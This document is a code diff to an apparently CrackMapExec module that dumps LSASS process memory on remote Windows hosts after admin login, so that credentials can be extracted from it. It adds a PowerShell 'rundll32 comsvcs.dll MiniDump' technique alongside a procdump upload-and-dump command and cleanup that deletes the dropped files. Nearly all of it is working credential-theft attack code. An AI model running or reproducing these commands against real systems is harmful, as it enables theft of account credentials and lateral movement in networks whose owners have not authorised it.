@@ -22,8 +22,7 @@ class CMEModule:
         '''
             TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
             SHARE               Share to upload procdump and dump lsass (default: C$)
-            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
-            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
+            PROCDUMP_PATH       Path to procdump on attacker host. If this is not set, "rundll32" method is used
             REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
@@ -35,8 +34,7 @@ class CMEModule:
 
         self.tmp_dir = "\\Windows\\Temp\\"
         self.share = "C$"
-        self.procdump = "procdump.exe"
-        self.procdump_path = "/tmp/"
+        self.procdump_path = False
         self.remote_lsass_dump = "tmp.dmp"
 
         if 'TMP_DIR' in module_options:
@@ -47,9 +45,6 @@ class CMEModule:
 
         if 'PROCDUMP_PATH' in module_options:
             self.procdump_path = module_options['PROCDUMP_PATH']
-
-        if 'PROCDUMP_EXE_NAME' in module_options:
-            self.procdump = module_options['PROCDUMP_EXE_NAME']
 
         if 'REMOTE_LSASS_DUMP' in module_options:
             self.remote_lsass_dump = module_options['REMOTE_LSASS_DUMP']
@@ -75,50 +70,13 @@ class CMEModule:
             self.without_edges = module_options['WITHOUT_EDGES']
 
     def on_admin_login(self, context, connection):
-        if self.bloodhound != False:
+        if self.bloodhound:
             self.set_as_owned(context, connection)
 
-        # Verify procdump exists on host
-        procdump_full_path = os.path.join(self.procdump_path, self.procdump)
-        if not os.path.exists(self.procdump_path):
-            context.log.error("{} directory does not exist.".format(self.procdump_path))
-            return 1
-        elif not os.path.exists(procdump_full_path):
-            context.log.error("{} does not exist.".format(procdump_full_path))
-            return 1
-
-        # Upload procdump
-        context.log.debug('Copy {} to {}'.format(procdump_full_path, self.tmp_dir))
-        with open(procdump_full_path, 'rb') as procdump:
-            try:
-                connection.conn.putFile(self.share, self.tmp_dir + self.procdump, procdump.read)
-                context.log.debug('Created file {} on the \\\\{}{}'.format(self.procdump, self.share, self.tmp_dir))
-            except Exception as e:
-                context.log.error('Error writing file to share {}: {}'.format(self.share, e))
-
-        # Dump lsass remotely
-        # Dump using lsass PID
-        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
-            self.tmp_dir, self.procdump, self.tmp_dir, self.remote_lsass_dump)
-        context.log.debug('Dumping lsass.exe')
-        p = connection.execute(command, True)
-        context.log.debug(p)
-
-        if 'Dump 1 complete' in p:
-            # Procdump ended
-            context.log.debug('Procdump output fully retrieved')
-        elif 'Dump 1 ini' in p:
-            # Procdump output not fully retrieved
-            context.log.debug('Procdump output partially retrieved')
-            # Since we cannot know when the dump finishes, we wait for 5s
-            time.sleep(2)
-        elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
-            context.log.error(
-                'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
-            )
-            return 1
+        if self.procdump_path:
+            self.procdump_dump(context, connection)
         else:
-            context.log.debug('Unknown error while dumping lsass, try CME with --verbose to see details. Trying anyway.')
+            self.dll_dump(context, connection)
 
         context.log.success("Process lsass.exe was successfully dumped")
 
@@ -163,6 +121,62 @@ class CMEModule:
             context.log.debug('-----   end output  -----')
             self.process_credentials(context, connection, out)
 
+        self.clean(context, connection)
+
+    def procdump_dump(self, context, connection):
+        # Verify procdump exists on host
+        if not os.path.exists(self.procdump_path):
+            context.log.error("{} does not exist.".format(self.procdump_path))
+            exit()
+
+        # Upload procdump
+        context.log.debug('Copy {} to {}'.format(self.procdump_path, self.tmp_dir))
+        with open(self.procdump_path, 'rb') as procdump:
+            try:
+                connection.conn.putFile(self.share, self.tmp_dir + "procdump.exe", procdump.read)
+                context.log.debug('Uploaded procdump.exe on the \\\\{}{}'.format(self.share, self.tmp_dir))
+            except Exception as e:
+                context.log.error('Error writing file to share {}: {}'.format(self.share, e))
+                self.clean(context, connection)
+                exit()
+
+        # Dump lsass remotely
+        # Dump using lsass PID
+        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}procdump.exe -accepteula -o -ma ^%B {}{}""".format(
+            self.tmp_dir, self.tmp_dir, self.remote_lsass_dump)
+        context.log.debug('Dumping lsass.exe')
+        p = connection.execute(command, True)
+        context.log.debug(p)
+
+        if 'Dump 1 complete' in p:
+            # Procdump ended
+            context.log.debug('Procdump output fully retrieved')
+        elif 'Dump 1 ini' in p:
+            # Procdump output not fully retrieved
+            context.log.debug('Procdump output partially retrieved')
+            # Since we cannot know when the dump finishes, we wait for 5s
+            time.sleep(2)
+        elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
+            context.log.error(
+                'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
+            )
+            self.clean(context, connection)
+            exit()
+        else:
+            context.log.debug(
+                'Unknown error while dumping lsass, try CME with --verbose to see details. Trying anyway.')
+
+    def dll_dump(self, context, connection):
+        """
+        Thanks to TiM0 for this trick. Admin Powershell has debug privilege, so we don't need SYSTEM to use the rundll32 technique
+        """
+        command = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
+            self.tmp_dir, self.remote_lsass_dump)
+        connection.execute(command, True)
+        # We have to wait for the dump to be finished. We do not have any information on when
+        #time.sleep(2)
+
+    def clean(self, context, connection):
         # Delete lsass dump
         try:
             connection.conn.deleteFile(self.share, self.tmp_dir + self.remote_lsass_dump)
@@ -170,12 +184,13 @@ class CMEModule:
         except Exception as e:
             context.log.error('Error deleting lsass dump : {}'.format(e))
 
-        # Delete procdump.exe
-        try:
-            connection.conn.deleteFile(self.share, self.tmp_dir + self.procdump)
-            context.log.success('Deleted procdump.exe')
-        except Exception as e:
-            context.log.error('Error deleting procdump.exe : {}'.format(e))
+        if self.procdump_path:
+            # Delete procdump.exe
+            try:
+                connection.conn.deleteFile(self.share, self.tmp_dir + "procdump.exe")
+                context.log.success('Deleted procdump.exe')
+            except Exception as e:
+                context.log.error('Error deleting procdump.exe : {}'.format(e))
 
     @staticmethod
     def run(cmd):
